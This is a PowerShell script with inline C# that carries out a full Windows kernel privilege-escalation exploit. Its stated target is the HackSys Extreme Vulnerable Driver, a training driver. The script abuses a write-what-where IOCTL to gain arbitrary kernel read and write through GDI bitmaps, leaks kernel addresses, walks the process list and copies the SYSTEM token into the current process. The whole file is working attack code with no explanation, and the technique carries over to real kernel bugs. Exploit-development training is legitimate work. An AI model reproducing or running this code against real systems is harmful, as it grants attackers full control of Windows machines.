Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct SYSTEM_MODULE_INFORMATION
{
	[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
	public UIntPtr[] Reserved;
	public IntPtr ImageBase;
	public UInt32 ImageSize;
	public UInt32 Flags;
	public UInt16 LoadOrderIndex;
	public UInt16 InitOrderIndex;
	public UInt16 LoadCount;
	public UInt16 ModuleNameOffset;
	[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
	internal Char[] _ImageName;
	public String ImageName {
		get {
			return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
		}
	}
}

[StructLayout(LayoutKind.Sequential)]
public struct _PROCESS_BASIC_INFORMATION
{
	public IntPtr ExitStatus;
	public IntPtr PebBaseAddress;
	public IntPtr AffinityMask;
	public IntPtr BasePriority;
	public UIntPtr UniqueProcessId;
	public IntPtr InheritedFromUniqueProcessId;
}

/// Partial _PEB
[StructLayout(LayoutKind.Explicit, Size = 256)]
public struct _PEB
{
	[FieldOffset(148)]
	public IntPtr GdiSharedHandleTable32;
	[FieldOffset(248)]
	public IntPtr GdiSharedHandleTable64;
}

[StructLayout(LayoutKind.Sequential)]
public struct _GDI_CELL
{
	public IntPtr pKernelAddress;
	public UInt16 wProcessId;
	public UInt16 wCount;
	public UInt16 wUpper;
	public UInt16 wType;
	public IntPtr pUserAddress;
}

public static class EVD
{

	[DllImport("ntdll.dll")]
	public static extern int NtQueryInformationProcess(
		IntPtr processHandle, 
		int processInformationClass,
		ref _PROCESS_BASIC_INFORMATION processInformation,
		int processInformationLength,
		ref int returnLength);

	[DllImport("ntdll.dll")]
	public static extern int NtQuerySystemInformation(
		int SystemInformationClass,
		IntPtr SystemInformation,
		int SystemInformationLength,
		ref int ReturnLength);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
  
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr VirtualAlloc(
		IntPtr lpAddress,
		uint dwSize,
		UInt32 flAllocationType,
		UInt32 flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(
        IntPtr lpAddress,
        uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary(
        string lpFileName);
      
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool FreeLibrary(
        IntPtr hModule);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateBitmap(
		int nWidth,
		int nHeight,
		uint cPlanes,
		uint cBitsPerPel,
		IntPtr lpvBits);

    [DllImport("gdi32.dll")]
    public static extern int SetBitmapBits(
        IntPtr hbmp,
        uint cBytes,
        byte[] lpBits);

    [DllImport("gdi32.dll")]
    public static extern int GetBitmapBits(
        IntPtr hbmp,
        int cbBuffer,
        IntPtr lpvBits);
}
"@

#==============================================[PEB]

# Flag architecture $x32Architecture/!$x32Architecture
if ([System.IntPtr]::Size -eq 4) {
	echo "`n[>] Target is 32-bit!"
	$x32Architecture = 1
} else {
	echo "`n[>] Target is 64-bit!"
}
# Current Proc handle
$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
# Process Basic Information
$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
$returnLength = New-Object Int
$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
# PID & PEB address
echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
if ($x32Architecture) {
	echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
} else {
	echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
}
# Lazy PEB parsing
$_PEB = New-Object _PEB
$_PEB = $_PEB.GetType()
$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
# GdiSharedHandleTable
if ($x32Architecture) {
	echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
} else {
	echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
}
# _GDI_CELL size
$_GDI_CELL = New-Object _GDI_CELL
$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)

#==============================================[/PEB]

#==============================================[Bitmap]

echo "`n[>] Creating Bitmaps.."

# Manager Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
if ($x32Architecture) {
	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
	echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
    echo "[+] Manager pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
} else {
	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
	echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
    echo "[+] Manager pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}

# Worker Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
if ($x32Architecture) {
	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
	echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
    echo "[+] Worker pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
} else {
	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
	echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
    echo "[+] Worker pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}

#==============================================[/Bitmap]

#==============================================[GDI ring0 primitive]

$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
  
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}

# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
#---
[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WorkerpvScan0).Length)
[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WorkerpvScan0), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WorkerpvScan0).Length)
if ($x32Architecture) {
	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
} else {
	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
}
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x22200B"
[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null

#==============================================[/GDI ring0 primitive]

#==============================================[Leak loaded module base addresses]

[int]$BuffPtr_Size = 0
while ($true) {
	[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
	$SystemInformationLength = New-Object Int

	# SystemModuleInformation Class = 11
	$CallResult = [EVD]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
	
	# STATUS_INFO_LENGTH_MISMATCH
	if ($CallResult -eq 0xC0000004) {
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
		[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
	}
	# STATUS_SUCCESS
	elseif ($CallResult -eq 0x00000000) {
		break
	}
	# Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
	else {
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
		echo "[!] Error, NTSTATUS Value: $('{0:X}' -f ($CallResult))`n"
		return
	}
}

$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
if ([System.IntPtr]::Size -eq 4) {
	$SYSTEM_MODULE_INFORMATION_Size = 284
} else {
	$SYSTEM_MODULE_INFORMATION_Size = 296
}

$BuffOffset = $BuffPtr.ToInt64()
$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
$BuffOffset = $BuffOffset + [System.IntPtr]::Size

$SystemModuleArray = @()
for ($i=0; $i -lt $HandleCount; $i++){
	$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
	$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
	
	$HashTable = @{
		ImageName = $Cast.ImageName
		ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
		ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
	}
	
	$Object = New-Object PSObject -Property $HashTable
	$SystemModuleArray += $Object

	$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
}

# Free SystemModuleInformation array
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)

#==============================================[/Leak loaded module base addresses]

#==============================================[Duplicate SYSTEM token]

# _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
# WARNING offsets are invalid for Pre-RTM images!
$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
switch ($OSMajorMinor)
{
    '10.0' # Win10 / 2k16
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e8
            $TokenOffset = 0x358          
            $ActiveProcessLinks = 0x2f0
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xf4          
            $ActiveProcessLinks = 0xb8
        }
    }
 
    '6.3' # Win8.1 / 2k12R2
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xec          
            $ActiveProcessLinks = 0xb8
        }
    }
 
    '6.2' # Win8 / 2k12
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xec          
            $ActiveProcessLinks = 0xb8
        }
    }
 
    '6.1' # Win7 / 2k8R2
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x180
            $TokenOffset = 0x208          
            $ActiveProcessLinks = 0x188
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xf8          
            $ActiveProcessLinks = 0xb8
        }
    }
}

# Arbitrary Kernel read
function Bitmap-Read {
    param ($Address)
    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    [IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
    $CallResult = [EVD]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
	if ($x32Architecture){
    	[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
	} else {
		[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
	}
    $CallResult = [EVD]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}

# Arbitrary Kernel write
function Bitmap-Write {
    param ($Address, $Value)
    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    $CallResult = [EVD]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
}

# Get EPROCESS entry for System process
echo "`n[>] Leaking SYSTEM _EPROCESS.."
$KernelBase = $SystemModuleArray[0].ImageBase
$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
$KernelHanle = [EVD]::LoadLibrary("$KernelType")
$PsInitialSystemProcess = [EVD]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
$CallResult = [EVD]::FreeLibrary($KernelHanle)
echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
echo "[+] SYSTEM _EPORCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)

# Get EPROCESS entry for current process
echo "`n[>] Leaking current _EPROCESS.."
echo "[+] Traversing ActiveProcessLinks list"
$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
while($true) {
	$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
	if ($NextPID -eq $PID) {
		echo "[+] PowerShell _EPORCESS address: 0x$("{0:X}" -f $NextProcess)"
		echo "[+] PID: $NextPID"
		echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
		$PoShTokenAddr = $NextProcess+$TokenOffset
		break
	}
	$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
}

# Duplicate token!
echo "`n[!] Duplicating SYSTEM token!`n"
Bitmap-Write -Address $PoShTokenAddr -Value $SysToken

#==============================================[/Duplicate SYSTEM token]